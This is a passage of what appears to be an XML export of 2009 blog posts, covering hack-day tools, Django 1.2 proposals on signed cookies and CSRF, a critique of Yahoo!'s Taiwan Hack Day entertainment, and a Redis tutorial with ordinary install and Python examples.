&lt;p&gt;Originally a kind of structured version of Wikipedia, Freebase changed its focus last year towards being a &quot;social database about things you know and love&quot;. In other words, it's the most powerful OCD-enabler in the history of the world. Create your own &quot;Base&quot; on any subject you like, set up your own types and start gathering together topics from the millions already available in Freebase - or add your own. Examples include the &lt;a href=&quot;http://battlestargalactica.freebase.com/&quot;&gt;Battlestar Galactica base&lt;/a&gt;, the &lt;a href=&quot;http://tallships.freebase.com/&quot;&gt;Tall Ships base&lt;/a&gt; and the fabulous &lt;a href=&quot;http://database.freebase.com/&quot;&gt;Database base&lt;/a&gt;. If you &lt;em&gt;are&lt;/em&gt; a developer the tools in the &lt;a href=&quot;http://www.freebase.com/make&quot;&gt;Make Things with Freebase&lt;/a&gt; section are top notch.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://www.dabbledb.com/&quot;&gt;Dabble DB&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;Dabble is a weird combination of a spreadsheet, an online database and a set of visualisation tools. Watch the 8 minute demo to get an idea of how powerful this is - you can start off by loading in an existing spreadsheet and take it from there. You'll need to sign up for the free 30 day trial.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://docs.google.com/&quot;&gt;Google Docs&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;You can always build a hack in Excel, but &lt;a href=&quot;http://docs.google.com/&quot;&gt;Google Spreadsheets&lt;/a&gt; is surprisingly powerful and means that you can collaborate with others on your hack (including developers, who can use the Google Docs API to get at the data in your spreadsheet). Check out the following tutorials, which describe ways of using Google Spreadsheets to scrape in data from other webpages and output it in interesting formats:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://ouseful.wordpress.com/2008/10/14/data-scraping-wikipedia-with-google-spreadsheets/&quot;&gt;Data Scraping Wikipedia with Google Spreadsheets&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://ouseful.wordpress.com/2008/10/23/calling-amazon-associatesecommerce-web-services-from-a-google-spreadsheet/&quot;&gt;Calling Amazon Associates/Ecommerce Web Services from a Google Spreadsheet&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There's also a simple way to &lt;a href=&quot;http://docs.google.com/support/bin/answer.py?hl=en&amp;amp;answer=87809&quot;&gt;create a form&lt;/a&gt; that submits data in to a Google Spreadsheet.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://pipes.yahoo.com/&quot;&gt;Yahoo! Pipes&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;Visual tools for combining, filtering and modifying RSS feeds. Combine with the large number of &lt;a href=&quot;http://www.guardian.co.uk/help/insideguardian/2008/oct/22/full-fat-rss-feed-upgrade&quot; title=&quot;Upgrading our RSS feeds&quot;&gt;full-content feeds on guardian.co.uk&lt;/a&gt; for all sorts of interesting possibilities. Here's &lt;a href=&quot;http://ouseful.wordpress.com/2008/10/20/mashup-reuse-are-you-lazy-enough/&quot; title=&quot;Mashup Reuse – Are You Lazy Enough?&quot;&gt;a tutorial&lt;/a&gt; that incorporates Google Docs as well.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://maps.google.com/help/maps/mymaps/create.html&quot;&gt;Google My Maps&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;Google provide a really neat interface for adding your own points, lines and areas to a Google Map. Outputs KML, a handy file format for carting geographic data around between different tools.&lt;/p&gt;

&lt;p&gt;If you already have a KML or GeoRSS feed URL from somewhere (e.g. the output of a Yahoo! Pipe), you can paste it directly in to the Google Maps search box to see the points rendered on a map.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://sketchup.google.com/&quot;&gt;Google SketchUp&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;A simple to use 3D drawing package that lets you create 3D models of real-world buildings and then import them in to &lt;a href=&quot;http://earth.google.com/&quot;&gt;Google Earth&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://www.openstreetmap.org/&quot;&gt;OpenStreetMap&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;Try your hand at some open source cartography on OpenStreetMap, the geographic world's answer to Wikipedia. If you have the equipment you can contribute GPS traces, otherwise there's a clever online editor that will let you trace out roads from satellite photos - or you could just make sure your favourite pub is included on the map. The export tools can provide vector or static maps, and if you export as SVG you can further edit your map in Illustrator or Inkscape.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://maps.cloudmade.com/&quot;&gt;CloudMade Maps&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;Commercial tools built on top of &lt;a href=&quot;http://www.openstreetmap.org/&quot;&gt;OpenStreetMap&lt;/a&gt;, the most exciting of which allows you to create your own map theme by setting your preferred colours and line widths for various types of map feature.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://manyeyes.alphaworks.ibm.com/manyeyes/&quot;&gt;Many Eyes&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;IBM Research's suite of data visualisation tools, with a wiki-style collaboration platform for publishing data and creating visualisations.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://www.dapper.net/open/&quot;&gt;Dapper&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;Dapper provides a powerful tool for screen scraping websites, without needing to write any code. Output formats include RSS, iCalendar and Google Maps.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://www.tiddlywiki.com/&quot;&gt;TiddlyWiki&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;TiddlyWiki is a complete wiki in a single HTML file, which you can save locally and use as a notebook, collaboration tool and much more. There's a large ecosystem of plugins and macros which can be used to extend it with new features - see &lt;a href=&quot;http://tiddlyvault.tiddlyspot.com/&quot;&gt;TiddlyVault&lt;/a&gt; for an index.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://www.wolframalpha.com/&quot;&gt;WolframAlpha&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;The &quot;computational knowledge engine&quot; with the &lt;a href=&quot;http://unqualified-reservations.blogspot.com/2009/07/wolfram-alpha-and-hubristic-user.html&quot;&gt;hubristic search-based interface&lt;/a&gt;, potentially useful as a source of data and a tool for processing and visualising that data.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://www.tumblr.com/&quot;&gt;Tumblr&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;Useful as both an input and an output for feeds processed using other tools, and with a smart bookmarklet for collecting bits and pieces from around the web.&lt;/p&gt;

&lt;h4&gt;&lt;a href=&quot;http://wiki.english.ucsb.edu/index.php/Toy_Chest_(Online_or_Downloadable_Tools_for_Building_Projects)&quot;&gt;The UCSB Toy Chest&lt;/a&gt;&lt;/h4&gt;

&lt;p&gt;An outstanding list of tools that people &quot;without programming skills (but with basic computer and Internet literacy) can use to create interesting projects&quot;, compiled by the English department at UC Santa Barbara.&lt;/p&gt;

&lt;h3&gt;Your help needed&lt;/h3&gt;

&lt;p&gt;There must be dozens, if not hundreds of useful tools missing from the above. Tell me in the comments and I'll add them to the list.&lt;/p&gt;</field>
		<field name="created">2009-07-28 14:23:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1591</field>
		<field name="title">Django ponies: Proposals for Django 1.2</field>
		<field name="slug">ponies</field>
		<field name="body">&lt;p&gt;I've decided to step up my involvement in Django development in the run-up to Django 1.2, so I'm currently going through several years worth of accumulated pony requests figuring out which ones are worth advocating for. I'm also ensuring I have the code to back them up - my innocent &lt;a href=&quot;http://code.djangoproject.com/wiki/AutoEscaping&quot;&gt;AutoEscaping proposal&lt;/a&gt; a few years ago resulted in an enormous amount of work by Malcolm and I don't think he'd appreciate a repeat performance.&lt;/p&gt;

&lt;p&gt;I'm not a big fan of branches when it comes to exploratory development - they're fine for doing the final implementation once an approach has been agreed, but I don't think they are a very effective way of discussing proposals. I'd much rather see working code in a separate application - that way I can try it out with an existing project without needing to switch to a new Django branch. Keeping code out of a branch also means people can start using it for real development work, making the API much easier to evaluate. Most of my proposals here have accompanying applications on GitHub.&lt;/p&gt;

&lt;p&gt;I've recently got in to the habit of including an &quot;examples&quot; directory with each of my experimental applications. This is a full Django project (with settings.py, urls.py and manage.py files) which serves two purposes. Firstly, it allows developers to run the application's unit tests without needing to install it in to their own pre-configured project, simply by changing in to the examples directory and running &lt;samp&gt;./manage.py test&lt;/samp&gt;. Secondly, it gives me somewhere to put demonstration code that can be viewed in a browser using the runserver command - a further way of making the code easier to evaluate. &lt;a href=&quot;http://github.com/simonw/django-safeform&quot;&gt;django-safeform&lt;/a&gt; is a good example of this pattern.&lt;/p&gt;

&lt;p&gt;Here's my current list of ponies, in rough order of priority.&lt;/p&gt;

&lt;h4&gt;Signing and signed cookies&lt;/h4&gt;

&lt;p&gt;Signing strings to ensure they have not yet been tampered with is a crucial technique in web application security. As with all cryptography, it's also surprisingly difficult to do correctly. &lt;a href=&quot;http://vnhacker.blogspot.com/2009/09/flickrs-api-signature-forgery.html&quot;&gt;A vulnerability in the signing implementation&lt;/a&gt; used to protect the Flickr API was revealed just today.&lt;/p&gt;

&lt;p&gt;One of the many uses of signed strings is to implement signed cookies. Signed cookies are fantastically powerful - they allow you to send cookies safe in the knowledge that your user will not be able to alter them without you knowing. This dramatically reduces the need for sessions - most web apps use sessions for security rather than for storing large amounts of data, so moving that &quot;logged in user ID&quot; value to a signed cookie eliminates the need for session storage entirely, saving a round-trip to persistent storage on every request.&lt;/p&gt;

&lt;p&gt;This has particularly useful implications for scaling - you can push your shared secret out to all of your front end web servers and scale horizontally, with no need for shared session storage just to handle simple authentication and &quot;You are logged in as X&quot; messages.&lt;/p&gt;

&lt;p&gt;The latest version of my &lt;a href=&quot;http://github.com/simonw/django-openid&quot;&gt;django-openid&lt;/a&gt; library uses signed cookies to store the OpenID you log in with, removing the need to configure Django's session storage. I've extracted that code in to &lt;a href=&quot;http://github.com/simonw/django-signed&quot;&gt;django-signed&lt;/a&gt;, which I hope to evolve in to something suitable for inclusion in &lt;samp&gt;django.utils&lt;/samp&gt;.&lt;/p&gt;

&lt;p&gt;Please note that django-signed has not yet been vetted by cryptography specialists, something I plan to fix before proposing it for final inclusion in core.&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;http://github.com/simonw/django-signed&quot;&gt;django-signed&lt;/a&gt; on GitHub&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://code.djangoproject.com/wiki/Signing&quot;&gt;Details of the Signing proposal&lt;/a&gt; on the Django wiki&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://groups.google.com/group/django-developers/browse_thread/thread/133509246caf1d91&quot;&gt;Signing discussion&lt;/a&gt; on the django-developers mailing list&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;Improved CSRF support&lt;/h4&gt;

&lt;p&gt;This is mainly Luke Plant's pony, but I'm very keen to see it happen. Django has shipped with CSRF protection for &lt;a href=&quot;http://code.djangoproject.com/changeset/2868&quot;&gt;more than three years now&lt;/a&gt;, but the approach (using middleware to rewrite form HTML) is relatively crude and, crucially, the protection isn't turned on by default. Hint: if you aren't 100% positive you are protected against &lt;a href=&quot;http://en.wikipedia.org/wiki/Cross-site_request_forgery&quot;&gt;CSRF&lt;/a&gt;, you should probably go and turn it on.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://bitbucket.org/spookylukey/django-trunk-lukeplant/src/05f0530f3207/django/contrib/csrf/&quot;&gt;Luke's approach&lt;/a&gt; is an iterative improvement - a template tag (with a dependency on RequestContext) is used to output the hidden CSRF field, with middleware used to set the cookie and perform the extra validation. I experimented at length with an alternative solution based around extending Django's form framework to treat CSRF as just another aspect of validation - you can see the result in my &lt;a href=&quot;http://github.com/simonw/django-safeform&quot;&gt;django-safeform&lt;/a&gt; project. My approach avoids middleware and template tags in favour of a view decorator to set the cookie and a class decorator to add a CSRF check to the form itself.&lt;/p&gt;

&lt;p&gt;While my approach works, the effort involved in upgrading existing code to it is substantial, compared to a much easier upgrade path for Luke's middleware + template tag approach. The biggest advantage of safeform is that it allows CSRF failure messages to be shown inline on the form, without losing the user's submission - the middleware check means showing errors as a full page without redisplaying the form. It looks like it should be possible to bring that aspect of safeform back to the middleware approach, and I plan to put together a patch for that over the next few days.&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;Luke's &lt;a href=&quot;http://bitbucket.org/spookylukey/django-trunk-lukeplant/src/05f0530f3207/django/contrib/csrf/&quot;&gt;CSRF branch&lt;/a&gt; on bitbucket&lt;/li&gt;
    &lt;li&gt;My &lt;a href=&quot;http://github.com/simonw/django-signed&quot;&gt;django-safeform&lt;/a&gt; on GitHub&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://code.djangoproject.com/wiki/CsrfProtection&quot;&gt;Details of the CSRF proposal&lt;/a&gt; on the Django wiki&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://groups.google.com/group/django-developers/browse_thread/thread/3d2dc750082103dc&quot;&gt;CSRF discussion&lt;/a&gt; on the django-developers mailing list&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;Better support for outputting HTML&lt;/h4&gt;

&lt;p&gt;This is a major pet peeve of mine. Django's form framework is excellent - one of the best features of the framework. There's just one thing that bugs me about it - it outputs full form widgets (for &lt;code&gt;input&lt;/code&gt;, &lt;code&gt;select&lt;/code&gt; and the like) so that it can include the previous value when redisplaying a form during validation, but it does so using XHTML syntax.&lt;/p&gt;

&lt;p&gt;I have a strong preference for an HTML 4.01 strict doctype, and all those &amp;lt;self-closing-tags /&amp;gt; have been niggling away at me for literally &lt;em&gt;years&lt;/em&gt;. Django bills itself as a framework for &quot;perfectionists with deadlines&quot;, so I feel justified in getting wound up out of proportion over this one.&lt;/p&gt;

&lt;p&gt;A year ago I started experimenting with a solution, and came up with &lt;a href=&quot;http://github.com/simonw/django-html&quot;&gt;django-html&lt;/a&gt;. It introduces two new Django template tags - &lt;code&gt;{% doctype %}&lt;/code&gt; and &lt;code&gt;{% field %}&lt;/code&gt;. The doctype tag serves two purposes - it outputs a particular doctype (saving you from having to remember the syntax) and it records that doctype in Django's template context object. The field tag is then used to output form fields, but crucially it gets to take the current doctype in to account.&lt;/p&gt;

&lt;p&gt;The field tag can also be used to add extra HTML attributes to form widgets from within the template itself, solving another small frustration about the existing form library. The &lt;a href=&quot;http://github.com/simonw/django-html/blob/master/README.rst&quot;&gt;README&lt;/a&gt; describes the new tags in detail.&lt;/p&gt;

&lt;p&gt;The way the tags work is currently a bit of a hack - if merged in to Django core they could be more cleanly implemented by refactoring the form library slightly. This refactoring is currently being discussed on the mailing list.&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;http://github.com/simonw/django-html&quot;&gt;django-html&lt;/a&gt; on GitHub&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://groups.google.com/group/django-developers/browse_thread/thread/bbf75f0eeaf9fa64&quot;&gt;Improved HTML discussion&lt;/a&gt; on the django-developers mailing list&lt;/li&gt;
&lt;/ul&gt;

&lt;h4&gt;Logging&lt;/h4&gt;

&lt;p&gt;This is the only proposal for which I don't yet have any code. I want to add official support for Python's standard logging framework to Django. It's possible to use this at the moment (I've done so on several projects) but it's not at all clear what the best way of doing so is, and Django doesn't use it internally at all. I posted a &lt;a href=&quot;http://groups.google.com/group/django-developers/browse_thread/thread/8551ecdb7412ab22&quot;&gt;full argument in favour of logging&lt;/a&gt; to the mailing list, but my favourite argument is this one:&lt;/p&gt;

&lt;blockquote cite=&quot;http://groups.google.com/group/django-developers/browse_thread/thread/8551ecdb7412ab22&quot;&gt;&lt;p&gt;Built-in support for logging reflects a growing reality of modern Web development: more and more sites have interfaces with external web service APIs, meaning there are plenty of things that could go wrong that are outside the control of the developer. Failing gracefully and logging what happened is the best way to deal with 3rd party problems - much better than throwing a 500 and leaving no record of what went wrong.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I'm not actively pursuing this one yet, but I'm very interesting in hearing people's opinions on the best way to configure and use the Python logging module in production.&lt;/p&gt;

&lt;h4&gt;A replacement for get_absolute_url()&lt;/h4&gt;

&lt;p&gt;Django has a loose convention of encouraging people to add a &lt;code&gt;get_absolute_url&lt;/code&gt; method to their models that returns that object's URL. It's a controversial feature - for one thing, it's a bit of a layering violation since URL logic is meant to live in the &lt;samp&gt;urls.py&lt;/samp&gt; file. It's incredibly convenient though, and since it's good web citizenship for everything to have one and only one URL I think there's a pretty good argument for keeping it.&lt;/p&gt;

&lt;p&gt;The problem is, the name sucks. I first took a look at this in the last few weeks before the release of Django 1.0 - what started as a quick proposal to come up with a better name before we were stuck with it quickly descended in to a quagmire as I realised quite how broken &lt;code&gt;get_absolute_url()&lt;/code&gt; is. The short version: in some cases it means &quot;get a relative URL starting with /&quot;, in other cases it means &quot;get a full URL starting with http://&quot; and the name doesn't accurately describe either.&lt;/p&gt;

&lt;p&gt;A full write-up of my investigation is &lt;a href=&quot;http://code.djangoproject.com/wiki/ReplacingGetAbsoluteUrl&quot;&gt;available on the Wiki&lt;/a&gt;. My proposed solution was to replace it with two complementary methods - &lt;code&gt;get_url()&lt;/code&gt; and &lt;code&gt;get_url_path()&lt;/code&gt; - with the user implementing one hence allowing the other one to be automatically derived. My &lt;a href=&quot;http://github.com/simonw/django-urls&quot;&gt;django-urls&lt;/a&gt; project illustrates the concept via a model mixin class. A year on I still think it's quite a neat idea, though as far as I can tell no one has ever actually used it.&lt;/p&gt;

&lt;ul&gt;
    &lt;li&gt;&lt;a href=&quot;http://code.djangoproject.com/wiki/ReplacingGetAbsoluteUrl&quot;&gt;ReplacingGetAbsoluteUrl&lt;/a&gt; on the wiki&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://github.com/simonw/django-urls&quot;&gt;django-urls&lt;/a&gt; on GitHub&lt;/li&gt;
    &lt;li&gt;&lt;a href=&quot;http://groups.google.com/group/django-developers/browse_thread/thread/7e69c39c23ec1079&quot;&gt;Recent get_absolute_url discussion&lt;/a&gt; on the django-developers mailing list&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Comments on this post are open, but if you have anything to say about any of the individual proposals it would be much more useful if you posted it to the relevant mailing list thread.&lt;/p&gt;</field>
		<field name="created">2009-09-28 23:32:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1592</field>
		<field name="title">This shouldn't be the image of Hack Day</field>
		<field name="slug">hackday</field>
		<field name="body">&lt;p&gt;I love hack days. I was working in the vicinity of Chad Dickerson when he organised the first internal Yahoo! Hack Day back in 2005, and I've since participated in hack day events at Yahoo!, Global Radio and the Guardian. I've also been to every one of Yahoo!'s Open Hack Day events in London. They're fantastic, and the team that organises them should be applauded.&lt;/p&gt;

&lt;p&gt;As such, I care a great deal about the image of hack day - and the videos that emerged from last weekend's &lt;a href=&quot;http://developer.yahoo.net/blog/archives/2009/10/2009_taiwan_hac.html&quot;&gt;Taiwan Hack Day&lt;/a&gt; are hugely disappointing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/static/2009/hack-girls-0.jpg&quot; width=&quot;440&quot; height=&quot;247&quot; alt=&quot;Hack Girl dancers at Open Hack Day Taiwan&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/static/2009/hack-girls-1.jpg&quot; width=&quot;440&quot; height=&quot;247&quot; alt=&quot;Hack Girl dancers at Open Hack Day Taiwan&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/static/2009/hack-girls-2.jpg&quot; width=&quot;440&quot; height=&quot;247&quot; alt=&quot;Hack Girl dancers at Open Hack Day Taiwan&quot; /&gt;&lt;/p&gt;

&lt;p&gt;(These are still images from the video - &lt;a href=&quot;http://www.flickr.com/photos/jeremyjohnstone/4019401218/&quot;&gt;the original&lt;/a&gt; has been taken down).&lt;/p&gt;

&lt;p&gt;Seriously, what the hell?&lt;/p&gt;

&lt;p&gt;I've heard arguments that this kind of thing is culturally acceptable in Taiwan - in fact it may even be expected for technology events, though I'd love to hear further confirmation. I don't care. The technology industry has a serious, widely recognised problem attracting female talent. The ratio of male to female attendants at most conferences I attend is embarassing - An Event Apart last week in Chicago was a notable and commendable exception.&lt;/p&gt;

&lt;p&gt;Our industry is still young. If we want an all-encompassing technology scene, we need to actively work to cultivate an inclusive environment. This means a zero tolerance approach to this kind of entertainment. Booth babes, tequila girls, and scantily clad gyrating women simply set the wrong tone, here or abroad. Heck, this isn't just about offending women - many guy geeks I know would be mortified by this kind of thing.&lt;/p&gt;

&lt;p&gt;Hack days are a celebration of ingenuity and creativity. Past US hack days have featured performances from Beck and Girl Talk, both of whom embody the creative spirit of the event. Sexy dancing girls? Not so much.&lt;/p&gt;

&lt;p&gt;I'm not the only one who's disappointed.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://twitter.com/Caterina/status/4967140857&quot;&gt;Caterina Fake&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://twitter.com/Caterina/status/4967140857&quot;&gt;&lt;p&gt;@Yahoo, for shame : &lt;a href=&quot;http://flic.kr/p/78btX1&quot;&gt;http://flic.kr/p/78btX1&lt;/a&gt; I'm frankly disgusted.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;http://twitter.com/chaddickerson/status/4966644906&quot;&gt;Chad Dickerson&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://twitter.com/chaddickerson/status/4966644906&quot;&gt;&lt;p&gt;i am *so* disappointed: &lt;a href=&quot;http://flic.kr/p/78btX1&quot;&gt;http://flic.kr/p/78btX1&lt;/a&gt;. remember, a team of women delivered the winning hack at the 1st one:&lt;a href=&quot;http://bit.ly/FokfF&quot;&gt;http://bit.ly/FokfF&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;There was &lt;a href=&quot;http://search.twitter.com/search?q=&amp;amp;ands=hack+day+taiwan&amp;amp;since=2009-10-17&amp;amp;until=2009-10-19&quot;&gt;a flurry of activity&lt;/a&gt; about this on Twitter yesterday. I sat on this entry for most of today, partly because writing this kind of thing is &lt;em&gt;really&lt;/em&gt; hard but also because I was hoping someone at Yahoo! would wake up and release some kind of statement. So far, nothing.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update (1:30am): &lt;/strong&gt; Chris Yeh of YDN has responded with &lt;a href=&quot;http://developer.yahoo.net/blog/archives/2009/10/taiwan_ohd_apology.html&quot;&gt;an appropriately worded apology&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2009-10-19 22:22:34</field>
		<field name="comments_open">1</field>
	</row>

	<row>
		<field name="id">1593</field>
		<field name="title">Why I like Redis</field>
		<field name="slug">redis</field>
		<field name="body">&lt;p&gt;I've been getting a lot of useful work done with &lt;a href=&quot;http://code.google.com/p/redis/&quot;&gt;Redis&lt;/a&gt; recently.&lt;/p&gt;

&lt;p&gt;Redis is typically categorised as yet another of those new-fangled NoSQL key/value stores, but if you look closer it actually has some pretty unique characteristics. It makes more sense to describe it as a &quot;data structure server&quot; - it provides a network service that exposes persistent storage and operations over dictionaries, lists, sets and string values. Think memcached but with list and set operations and persistence-to-disk.&lt;/p&gt;

&lt;p&gt;It's also incredibly easy to set up, &lt;a href=&quot;http://code.google.com/p/redis/wiki/Benchmarks&quot; title=&quot;How Fast is Redis?&quot;&gt;ridiculously fast&lt;/a&gt; (30,000 read or writes a second on my laptop with the default configuration) and has an interesting approach to persistence. Redis runs in memory, but syncs to disk every Y seconds or after every X operations. Sounds risky, but it supports replication out of the box so if you're worried about losing data should a server fail you can always ensure you have a replicated copy to hand. I wouldn't trust my only copy of critical data to it, but there are plenty of other cases for which it is really well suited.&lt;/p&gt;

&lt;p&gt;I'm currently not using it for data storage at all - instead, I use it as a tool for processing data using the interactive Python interpreter.&lt;/p&gt;

&lt;p&gt;I'm a huge fan of REPLs. When programming Python, I spend most of my time in an &lt;a href=&quot;http://ipython.scipy.org/&quot;&gt;IPython&lt;/a&gt; prompt. With JavaScript, I use the &lt;a href=&quot;http://getfirebug.com/cl.html&quot;&gt;Firebug console&lt;/a&gt;. I experiment with APIs, get something working and paste it over in to a text editor. For some one-off data transformation problems I never save any code at all - I run a couple of list comprehensions, dump the results out as JSON or CSV and leave it at that.&lt;/p&gt;

&lt;p&gt;Redis is an excellent complement to this kind of programming. I can run a long running batch job in one Python interpreter (say loading a few million lines of CSV in to a Redis key/value lookup table) and run another interpreter to play with the data that's already been collected, even as the first process is streaming data in. I can quit and restart my interpreters without losing any data. And because Redis semantics map closely to Python native data types, I don't have to think for more than a few seconds about how I'm going to represent my data.&lt;/p&gt;

&lt;p&gt;Here's a 30 second guide to getting started with Redis:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;$ wget http://redis.googlecode.com/files/redis-1.01.tar.gz
$ tar -xzf redis-1.01.tar.gz
$ cd redis-1.01
$ make
$ ./redis-server&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And that's it - you now have a Redis server running on port 6379. No need even for a &lt;samp&gt;./configure&lt;/samp&gt; or &lt;samp&gt;make install&lt;/samp&gt;. You can run &lt;samp&gt;./redis-benchmark&lt;/samp&gt; in that directory to exercise it a bit.&lt;/p&gt;

&lt;p&gt;Let's try it out from Python. In a separate terminal:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;$ cd redis-1.01/client-libraries/python/
$ python
&amp;gt;&amp;gt;&amp;gt; import redis
&amp;gt;&amp;gt;&amp;gt; r = redis.Redis()
&amp;gt;&amp;gt;&amp;gt; r.info()
{u'total_connections_received': 1, ... }
&amp;gt;&amp;gt;&amp;gt; r.keys('*') # Show all keys in the database
[]
&amp;gt;&amp;gt;&amp;gt; r.set('key-1', 'Value 1')
'OK'
&amp;gt;&amp;gt;&amp;gt; r.keys('*')
[u'key-1']
&amp;gt;&amp;gt;&amp;gt; r.get('key-1')
u'Value 1'&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now let's try something a bit more interesting:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;&amp;gt;&amp;gt;&amp;gt; r.push('log', 'Log message 1', tail=True)
&amp;gt;&amp;gt;&amp;gt; r.push('log', 'Log message 2', tail=True)
&amp;gt;&amp;gt;&amp;gt; r.push('log', 'Log message 3', tail=True)
&amp;gt;&amp;gt;&amp;gt; r.lrange('log', 0, 100)
[u'Log message 3', u'Log message 2', u'Log message 1']
&amp;gt;&amp;gt;&amp;gt; r.push('log', 'Log message 4', tail=True)
&amp;gt;&amp;gt;&amp;gt; r.push('log', 'Log message 5', tail=True)
&amp;gt;&amp;gt;&amp;gt; r.push('log', 'Log message 6', tail=True)
&amp;gt;&amp;gt;&amp;gt; r.ltrim('log', 0, 2)
&amp;gt;&amp;gt;&amp;gt; r.lrange('log', 0, 100)
[u'Log message 6', u'Log message 5', u'Log message 4']&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That's a simple capped log implementation (similar to a &lt;a href=&quot;http://www.mongodb.org/display/DOCS/Capped+Collections&quot;&gt;MongoDB capped collection&lt;/a&gt;) - &lt;samp&gt;push&lt;/samp&gt; items on to the tail of a 'log' key and use &lt;samp&gt;ltrim&lt;/samp&gt; to only retain the last X items. You could use this to keep track of what a system is doing right now without having to worry about storing ever increasing amounts of logging information.&lt;/p&gt;

&lt;p&gt;See the documentation for a &lt;a href=&quot;http://code.google.com/p/redis/wiki/CommandReference&quot;&gt;full list of Redis commands&lt;/a&gt;. I'm particularly excited about the &lt;samp&gt;RANDOMKEY&lt;/samp&gt; and new &lt;samp&gt;SRANDMEMBER&lt;/samp&gt; commands (&lt;a href=&quot;http://github.com/antirez/redis/commit/2abb95a9a849453eeb864e919ea0b8d6495a6a2a&quot;&gt;git trunk only&lt;/a&gt; at the moment), which help address the common challenge of picking a random item without &lt;code class=&quot;sql&quot;&gt;ORDER BY RAND()&lt;/code&gt; clobbering your relational database. In a beautiful example of open source support in action, I &lt;a href=&quot;http://twitter.com/simonw/status/5027987857&quot;&gt;requested SRANDMEMBER on Twitter&lt;/a&gt; yesterday and &lt;a href=&quot;http://twitter.com/antirez&quot; title=&quot;Salvatore Sanfilippo&quot;&gt;antirez&lt;/a&gt; committed just 12 hours later.&lt;/p&gt;

&lt;p&gt;I used Redis this week to help create &lt;a href=&quot;http://www.guardian.co.uk/news/datablog/2009/oct/19/bnp-membership-list-constituency&quot; title=&quot;BNP membership where you live&quot;&gt;heat maps of the BNP's membership list&lt;/a&gt; for the Guardian. I had the leaked spreadsheet of the BNP member details and a (licensed) CSV file mapping 1.6 million postcodes to their corresponding parliamentary constituencies. I loaded the CSV file in to Redis, then looped through the 12,000 postcodes from the membership and looked them up in turn, accumulating counts for each constituency. It took a couple of minutes to load the constituency data and a few seconds to run and accumulate the postcode counts. In the end, it probably involved less than 20 lines of actual Python code.&lt;/p&gt;

&lt;p&gt;A much more interesting example of an application built on Redis is &lt;a href=&quot;http://hurl.it/&quot;&gt;Hurl&lt;/a&gt;, a tool for debugging HTTP requests built in 48 hours by Leah Culver and Chris Wanstrath. The &lt;a href=&quot;http://github.com/defunkt/hurl&quot;&gt;code is now open source&lt;/a&gt;, and Chris talks a bit more about the implementation (in particular their use of sort in Redis) &lt;a href=&quot;http://ozmm.org/posts/sort_in_redis.html&quot;&gt;on his blog&lt;/a&gt;. Redis also gets a mention in Tom Preston-Werner's &lt;a href=&quot;http://github.com/blog/530-how-we-made-github-fast&quot;&gt;epic writeup&lt;/a&gt; of the new scalable architecture behind GitHub.&lt;/p&gt;</field>
		<field name="created">2009-10-22 10:58:21</field>
		<field name="comments_open">1</field>
	</row>

	<row>
